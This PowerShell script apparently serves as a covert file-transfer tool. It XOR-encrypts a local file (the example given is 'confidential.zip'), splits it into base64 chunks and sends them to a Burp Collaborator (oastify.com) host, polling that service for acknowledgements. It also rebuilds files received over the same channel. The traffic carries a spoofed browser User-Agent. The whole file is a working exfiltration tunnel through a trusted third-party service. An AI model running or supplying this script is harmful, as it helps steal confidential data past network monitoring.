$ProgressPreference = "SilentlyContinue"

$HEADERS = @{
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
    "Accept-Encoding" = "gzip, deflate"
    "Accept" = "*/*"
    "Accept-Language" = "en"
}
$RNRN = "`r`n`r`n"
$SECONDS = 500 # Milliseconds



Function decode($chunk) {

    write-host "[+] Decoding ..."

    $i = 1
    $b64 = ""

    foreach ($e in $chunk.GetEnumerator()) {
        if ($i -ne [Int]$e.Name) {
            write-host "[!] Wrong position for chunk ${i} !"
        }
        $b64 += $e.Value
        $i += 1
    }
    return [System.Convert]::FromBase64String($b64)
}



Function decrypt($data, $key) {

    write-host "[+] Decrypting ..."

    xor $data $key
}



Function download($hostname, $biid, $key, $filename) {

    write-host "[+] Downloading ${filename} ..."

    $chunk = [Ordered]@{}
    $lastChunk = $false

    while ($true) {
        write-host "Polling ..."

        $content = fetch($biid)

        foreach ($e in $content.responses) {
            if ($e.protocol -eq "https"){
                $client = $e.client
                $time = $e.time

                $requestToBC = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($e.data.request))
                $pos = $requestToBC.indexof($RNRN) + 4

                $body = -join ($requestToBC[$pos..$requestToBC.Length]) | ConvertFrom-Json

                $chunk.add($body.chunkId, $body.payload)

                write-host "$($body.chunkId) - [${client}] - ${time} - https - $($body.payload.length) bytes"

                $lastChunk = [Int]$body.lastChunk -eq 1

                send $hostname @{"ack" = $body.chunkId}
            }
        }

        if ($lastChunk) {
            break
        }

        Start-Sleep -Milliseconds $SECONDS
    }

    if ($chunk.count) {
        $data = decode $chunk
        decrypt $data $key
        saveToDisk $filename $data
    }
}



Function encode($bytes) {

    write-host "[+] Encoding ..."

    return [System.Convert]::ToBase64String($bytes)
}



Function encrypt($data, $key) {

    write-host "[+] Encrypting ..."

    xor $data $key
}



Function fetch($biid) {

    $urlToReceive = "https://polling.oastify.com/burpresults"
    $parametersToReceive = @{
        "biid" = "$biid"
    }
    $r = Invoke-WebRequest -Method "Get" -Uri $urlToReceive -Headers $HEADERS -Body $parametersToReceive
    return $r.Content | ConvertFrom-Json

}



Function getPath($filename) {
    
    $r = Resolve-Path $filename -ErrorAction SilentlyContinue
    if (!$r) {
        $r = $error[0].targetobject
    }

    return $r.ToString()
}



Function saveToDisk($filename, $data) {

    write-host "[+] Saving to disk ..."

    [System.IO.File]::WriteAllBytes($filename, $data)
}



Function send($hostname, $bodyToSend) {

    Invoke-WebRequest -Method "Post" -Uri ("https://${hostname}") -Headers $HEADERS -Body ($bodyToSend | ConvertTo-Json) -ContentType "application/json" > $null
}



Function upload($hostname, $biid, $key, $filename) {

    $bytes = [System.IO.File]::ReadAllBytes($filename)

    encrypt $bytes $key

    $b64 = encode($bytes)
    $b64l = $b64.length

    write-host "[+] Uploading ${filename} ..."

    $chunkSize = 7500

    $chunkId = 1

    for ($i = 0; $i -lt $b64l; $i += $chunkSize) {
        $size = $b64l - $i
        $lastChunk = 1
        if ($size -gt $chunkSize) {
            $size = $chunkSize
            $lastChunk = 0
        }

        $bodyToSend = @{
            "chunkId" = "$chunkId"
            "lastChunk" = "$lastChunk"
            "payload" = -join $b64[$i..($i + $chunkSize - 1)]
        }

        $received = $false

        while ( $received -eq $false ) {
            write-host "${chunkId} - ${size} bytes"

            send $hostname $bodyToSend
            $maxRetries = 30

            while ($maxRetries) {
                $content = fetch($biid)
                $maxRetries -= 1

                foreach ($e in $content.responses) {
                    if ($e.protocol -eq "https"){
                        $requestToBC = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($e.data.request))
                        $pos = $requestToBC.indexof($RNRN) + 4
                        $body = -join $requestToBC[$pos..$requestToBC.Length] | ConvertFrom-Json
                        $ack = [Int]$body.ack

                        if ( $chunkId -eq $ack ) {
                            $received = $true
                            $maxRetries = 0
                            break
                        }
                    }
                }
                Start-Sleep -Milliseconds $SECONDS
            }
        }
        $ChunkId += 1
    }
}



Function xor($data, $key) {

    $bkey = @()
    $kl = $key.length

    for ($i = 0; $i -lt $kl; $i++) {
        $bkey += [int][char]$key[$i % $kl]
    }

    for ($i = 0; $i -lt $data.length; $i++) {
        $data[$i] = $data[$i] -bxor $bkey[$i % $kl]
    }
}



# Required arguments
$action = $args[0] # download | upload
$hostname = $args[1] # hostname.oastify.com
$biid = $args[2] # biid=
$filename = getPath $args[3] # confidential.zip
$key = $args[4] # 1234qwer

if ($key.Length -eq 0) {
    $secureString = Read-Host -AsSecureString -Prompt "Enter Key"
    $key = [System.Net.NetworkCredential]::new("", $secureString).Password
}



if ($action -eq "download") {
    download $hostname $biid $key $filename
} elseif ($action -eq "upload") {
    upload $hostname $biid $key $filename
}
